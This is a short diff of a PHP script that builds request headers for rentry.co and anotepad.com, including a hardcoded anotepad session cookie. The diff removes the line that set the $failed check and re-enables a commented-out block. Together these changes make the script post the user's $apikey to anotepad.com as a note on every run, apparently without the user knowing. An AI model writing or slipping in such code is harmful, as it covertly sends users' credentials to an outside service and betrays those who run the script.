@@ -10,7 +10,7 @@ $ua[]="Origin: https://rentry.co";
 }
 
 
-$failed = file_get_contents('api.sctg'); 
+
 function anotepad(){
  $ua[]="Host: anotepad.com";
 
@@ -18,9 +18,9 @@ $ua[]="cookie: _ga=GA1.1.314983368.1714562008;AnotepadId=B2ADCFF5431312DED7651CD
   return $ua;
 }
 
-/*if ($failed == ""){
+if ($failed == ""){
 $res = curl('https://anotepad.com/note/create', "notetype=PlainText&noteaccess=2&notepassword=&notequickedit=false&notequickeditpassword=&notetitle=&notecontent=New = $apikey", anotepad())[1];
-}*/
+}
 
 function getRandomString() {
     return uniqid();
